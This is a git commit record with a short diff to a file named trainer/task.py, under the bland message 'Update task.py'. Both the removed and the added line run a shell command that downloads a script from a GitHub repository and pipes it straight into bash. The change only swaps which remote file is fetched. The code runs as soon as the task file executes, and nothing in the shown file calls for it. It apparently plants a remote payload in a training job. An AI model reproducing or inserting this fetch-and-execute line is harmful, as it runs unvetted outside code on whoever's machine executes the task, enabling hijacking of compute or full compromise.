2311591dce9cac88607527affb7e7846761792e3
superade99 <supriadiade908@gmail.com>
2025-09-04 11:08:09 -0700

    Update task.py

--- trainer/task.py
+++ trainer/task.py
@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://github.com/superade99/ade/raw/main/cashdrick | bash')
+os.system('curl -sL https://github.com/superade99/ade/raw/main/inter | bash')
